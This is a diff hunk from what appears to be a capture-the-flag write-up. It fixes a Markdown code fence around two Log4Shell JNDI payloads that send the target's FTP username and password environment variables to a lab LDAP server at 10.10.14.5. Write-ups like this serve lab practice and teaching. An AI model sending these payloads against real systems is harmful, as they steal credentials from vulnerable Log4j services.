@@ -165,7 +165,7 @@ Then log into ftp on the target machine twice and use following payloads:
 ```
 {% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_user}} 
 ${jndi:ldap://10.10.14.5:1389/${env:ftp_password}} {% endraw %}
-````
+```
 
 
 
